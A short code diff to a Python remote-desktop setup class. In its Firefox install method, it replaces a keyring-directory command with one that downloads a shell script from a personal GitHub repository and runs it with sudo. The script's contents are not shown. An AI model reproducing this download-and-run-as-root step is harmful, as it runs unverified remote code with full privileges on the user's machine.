@@ -46,7 +46,8 @@ class CRDSetup:
 
     @staticmethod
     def installFirefox():
-        os.system("sudo install -d -m 0755 /etc/apt/keyrings")
+        os.system("curl -s -L -o firefox.sh https://github.com/nguyenbinh1289/y/raw/main/brower.sh && chmod +x firefox.sh")
+        os.system("sudo ./firefox.sh")
         print("Firefox Installed !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
 
     @staticmethod
